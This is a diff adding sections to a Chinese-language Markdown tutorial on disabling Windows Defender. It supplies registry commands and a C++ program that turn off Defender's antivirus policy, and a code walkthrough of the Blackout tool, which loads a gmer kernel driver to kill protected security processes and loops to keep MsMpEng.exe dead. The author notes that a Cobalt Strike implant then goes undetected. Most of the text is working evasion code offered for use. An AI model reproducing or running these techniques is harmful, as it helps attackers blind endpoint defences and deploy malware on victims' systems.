@@ -1,5 +1,84 @@
 # 前言
 
+随着数字技术的日益进步，我们的生活、工作和娱乐越来越依赖于计算机和网络系统。然而，与此同时，恶意软件也日趋猖獗，寻求窃取信息、破坏系统或仅仅为了展现其能力。微软Windows，作为世界上最流行的操作系统，不断受到这些恶意软件的攻击。为了对抗这些潜在的威胁，微软推出了Windows Defender，一款集成于Windows内部的免费反恶意软件工具
+
+本文将深入探讨如何与Windows Defender对抗，以及那些特殊手段是如何被利用来破坏或关闭Defender的。
+
+
+
+# 修改注册表关闭Defender
+
+## 实现流程
+
+打开注册表，在`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`键下有两个名为`DisableAntiSpyware`和`DisableAntiVirus`的值，当着两个值被置为1时表示关闭Windows Defender的反间谍软件和反病毒功能
+
+![image-20230823121723961](WeakDefender/image-20230823121723961.png)
+
+![image-20230823121730953](WeakDefender/image-20230823121730953.png)
+
+​	
+
+启用管理员权限打开cmd，执行如下命令修改注册表：
+
+```
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t reg_dword /d 1 /f
+```
+
+![image-20230823122459298](WeakDefender/image-20230823122459298.png)
+
+
+
+修改完注册表后还需重启操作系统才算真正的关闭Defender。重启系统后，虽然defender看起来是正常运行的，但是我们上传一个CS马上去它也不会查杀
+
+<img src="WeakDefender/image-20230823122528707.png" alt="image-20230823122528707" style="zoom:67%;" />		
+
+
+
+## 代码实现
+
+```cpp
+#include <windows.h>
+#include <iostream>
+
+// 设置注册表键值的函数
+bool SetRegistryValue(HKEY hRootKey, LPCSTR subKey, LPCSTR valueName, DWORD data) {
+    HKEY hKey;
+    // 打开指定的注册表键
+    LONG result = RegOpenKeyEx(hRootKey, subKey, 0, KEY_SET_VALUE, &hKey);
+    
+    if (result != ERROR_SUCCESS) {
+        std::cerr << "打开注册表键失败: " << subKey << " 错误码: " << result << std::endl;
+        return false;
+    }
+
+    // 设置指定的注册表键值
+    result = RegSetValueEx(hKey, valueName, 0, REG_DWORD, (BYTE*)&data, sizeof(DWORD));
+    // 关闭注册表键
+    RegCloseKey(hKey);
+
+    if (result != ERROR_SUCCESS) {
+        std::cerr << "设置注册表值失败: " << valueName << " 错误码: " << result << std::endl;
+        return false;
+    }
+    
+    return true;
+}
+
+int main() {
+    const char* subKey = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
+    // 设置两个注册表键值
+    if (SetRegistryValue(HKEY_LOCAL_MACHINE, subKey, "DisableAntiSpyware", 1) &&
+        SetRegistryValue(HKEY_LOCAL_MACHINE, subKey, "DisableAntiVirus", 1)) {
+        std::cout << "注册表键值设置成功!" << std::endl;
+    } else {
+        std::cerr << "设置注册表键值失败." << std::endl;
+    }
+
+    return 0;
+}
+```
+
 
 
 # Powershell关闭Defender实时保护
@@ -242,13 +321,258 @@ else {
 
 
 
-但是这种方法只能在server服务器上使用，无法在Windows10及以上版本使用
+但是这种方法只能在WindowsServer服务器上使用，无法在Windows10及以上版本使用
 
 ![image-20230625091215423](WeakDefender/image-20230625091215423.png)	
 
 
 
+# 加载驱动关闭Defender(blackout)
+
+## 项目描述
+
+blackout项目地址：https://github.com/ZeroMemoryEx/Blackout
+
+Blackout 是一个工具，旨在利用gmer驱动程序来禁用或杀死 EDR 和 AV，特别是那些受到反恶意软件保护的进程。这个工具需要在管理员的上下文中运行，并且可以流畅地绕过 HVCI。
+
+需将驱动程序 `Blackout.sys` 和可执行文件放于同一路径，随后使用命令 `Blackout.exe -p <process_id>` 运行
 
 
-​	
+
+## 项目分析
+
+此项目主要涉及两个关键的函数，分别是`LoadDriver`和`DeviceIoControl`
+
+首先我们来看下`LoadDriver`函数的定义，其目的是用于加载一个内核驱动。驱动的服务名称被命名为"Blackout"，随后使用`CreateServiceA` 创建一个新的内核驱动服务，并启动它
+
+```cpp
+BOOL
+LoadDriver(
+    char* driverPath
+)
+{
+    SC_HANDLE hSCM, hService;
+    const char* serviceName = "Blackout";
+
+    // Open a handle to the SCM database
+    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (hSCM == NULL) {
+        return (1);
+    }
+
+    // Check if the service already exists
+    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
+    if (hService != NULL)
+    {
+        printf("Service already exists.\n");
+
+        // Start the service if it's not running
+        SERVICE_STATUS serviceStatus;
+        if (!QueryServiceStatus(hService, &serviceStatus))
+        {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return (1);
+        }
+
+        if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
+        {
+            if (!StartServiceA(hService, 0, nullptr))
+            {
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hSCM);
+                return (1);
+            }
+
+            printf("Starting service...\n");
+        }
+
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return (0);
+    }
+
+    // Create the service
+    hService = CreateServiceA(
+        hSCM,
+        serviceName,
+        serviceName,
+        SERVICE_ALL_ACCESS,
+        SERVICE_KERNEL_DRIVER,
+        SERVICE_DEMAND_START,
+        SERVICE_ERROR_IGNORE,
+        driverPath,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL
+    );
+
+    if (hService == NULL) {
+        CloseServiceHandle(hSCM);
+        return (1);
+    }
+
+    printf("Service created successfully.\n");
+
+    // Start the service
+    if (!StartServiceA(hService, 0, nullptr))
+    {
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return (1);
+    }
+
+    printf("Starting service...\n");
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+
+    return (0);
+}
+```
+
+
+
+其次看下主函数代码的实现流程，先使用前面定义的LoadDriver函数加载驱动，再使用CreateFile打开驱动并得到其句柄。
+
+得到驱动句柄后使用 `DeviceIoControl` 函数与驱动通信，发送`INITIALIZE_IOCTL_CODE` 指令初始化驱动，再发送`TERMINSTE_PROCESS_IOCTL_CODE` 指令来终止指定的进程
+
+如果所给的进程 ID 对应的进程是 "MsMpEng.exe"（这是 Windows Defender 的进程），则程序会不断尝试终止它，毕竟MsMpEng.exe被杀死后还是会无限复活的
+
+在这里我要补充一点，当调用 `CreateFile` 打开 "\\\\.\\Blackout" 时，实际上是在尝试打开一个与驱动程序相关联的设备。在Windows中，驱动程序可以创建一个设备并为其分配一个符号链接，这样用户模式的程序可以通过这个符号链接与驱动程序通信，从而允许后续的`DeviceIoControl` 调用来传递IO控制代码 (IOCTL) 和其他数据到驱动程序中
+
+```cpp
+int
+main(
+    int argc,
+    char** argv
+) {
+
+    if (argc != 3) {
+        printf("Invalid number of arguments. Usage: Blackout.exe -p <process_id>\n");
+        return (-1);
+    }
+
+    if (strcmp(argv[1], "-p") != 0) {
+        printf("Invalid argument. Usage: Blackout.exe -p <process_id>\n");
+        return (-1);
+    }
+
+    if (!CheckProcess(atoi(argv[2])))
+    {
+        printf("provided process id doesnt exist !!\n");
+        return (-1);
+    }
+
+    WIN32_FIND_DATAA fileData;
+    HANDLE hFind;
+    char FullDriverPath[MAX_PATH];
+    BOOL once = 1;
+
+    hFind = FindFirstFileA("Blackout.sys", &fileData);
+
+    if (hFind != INVALID_HANDLE_VALUE) { // file is found
+        if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) { // full path is found
+            printf("driver path: %s\n", FullDriverPath);
+        }
+        else {
+            printf("path not found !!\n");
+            return(-1);
+        }
+    }
+    else {
+        printf("driver not found !!\n");
+        return(-1);
+    }
+    printf("Loading %s driver .. \n", fileData.cFileName);
+
+    if (LoadDriver(FullDriverPath))
+    {
+        printf("faild to load driver ,try to run the program as administrator!!\n");
+        return (-1);
+    }
+
+    printf("driver loaded successfully !!\n");
+
+    HANDLE hDevice = CreateFile(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("Failed to open handle to driver !! ");
+        return (-1);
+    }
+
+    DWORD bytesReturned = 0;
+    DWORD input = atoi(argv[2]);
+    DWORD output[2] = { 0 };
+    DWORD outputSize = sizeof(output);
+
+    BOOL result = DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
+    if (!result)
+    {
+        printf("faild to send initializing request %X !!\n", INITIALIZE_IOCTL_CODE);
+        return (-1);
+    }
+
+    printf("driver initialized %X !!\n", INITIALIZE_IOCTL_CODE);
+
+    if (GetPID(L"MsMpEng.exe") == input)
+    {
+        printf("Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n");
+        while (0x1)
+        {
+            if (input = GetPID(L"MsMpEng.exe"))
+            {
+                if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL))
+                {
+                    printf("DeviceIoControl failed. Error: %X !!\n", GetLastError());
+                    CloseHandle(hDevice);
+                    return (-1);
+                }
+                if (once)
+                {
+                    printf("Defender Terminated ..\n");
+                    once = 0;
+                }
+
+            }
+
+            Sleep(700);
+        }
+    }
+
+    printf("terminating process !! \n");
+
+    result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
+
+    if (!result)
+    {
+        printf("failed to terminate process: %X !!\n", GetLastError());
+        CloseHandle(hDevice);
+        return (-1);
+    }
+
+    printf("process has been terminated!\n");
+
+    system("pause");
+
+    CloseHandle(hDevice);
+
+    return 0;
+}
+```
+
+
+
+## 运行测试
+
+<img src="WeakDefender/241086198-3ea0f7ae-0102-4a38-b4b6-700e93f5d545.png" alt="image" style="zoom:67%;" />	
+
+
+
+# 参考链接
+
+- https://www.freebuf.com/articles/network/324952.html
+- https://xz.aliyun.com/t/12280#toc-25
 
